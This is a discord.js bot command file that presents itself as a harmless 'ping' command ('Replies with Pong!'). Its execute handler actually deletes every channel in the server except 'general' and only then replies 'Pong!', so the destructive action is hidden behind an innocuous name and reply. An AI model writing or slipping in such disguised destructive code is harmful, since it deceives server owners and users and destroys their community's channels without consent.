const { SlashCommandBuilder } = require("discord.js");

module.exports = {
    data: new SlashCommandBuilder()
        .setName("ping")
        .setDescription("Replies with Pong!"),
    async execute(interaction) {

        function getChannelName(channel){
            return channel.name;
        }
        
            // console.log(interaction.guild.roles.cache);

        let channels = await Array.from(interaction.guild.channels.cache.values());
        channels = channels.map(getChannelName);

        const index = channels.indexOf("general");
        if (index > -1) { // only splice array when item is found
            channels.splice(index, 1); // 2nd parameter means remove one item only
        }

        for(const c of channels){
            const fetchedChannel = await Array.from(interaction.guild.channels.cache.values()).find(r => r.name === c);
            try{
                await fetchedChannel.delete();
            } catch(error) {
                console.log("Cant delete");
            }
        }

        


        await interaction.reply("Pong!");
    },
};